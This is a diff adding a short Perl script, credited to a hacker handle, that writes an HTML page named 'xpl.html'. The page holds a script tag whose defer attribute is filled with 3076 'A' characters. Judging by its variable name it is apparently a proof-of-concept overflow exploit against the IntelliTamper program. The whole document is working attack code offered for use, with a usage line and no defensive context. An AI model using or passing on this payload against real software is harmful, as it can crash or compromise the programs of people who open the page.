@@ -1,0 +1,10 @@
+# H0m3 : S3curity-art.com & Google.com
+# M4!L : Wizard-skh@hotmail.com<mailto:Wizard-skh@hotmail.com> & My@hotmail.it<mailto:My@hotmail.it>
+# usage : perl xpl.pl >>xpl.html
+my $IntelliTamper_html ='<html><head><title>SkuLL-HackeR Home
+World</title></head><body>' .
+'<script defer="' .
+"\x41" x 3076 .
+'">' .
+"</body></html>";
+print $IntelliTamper_html;
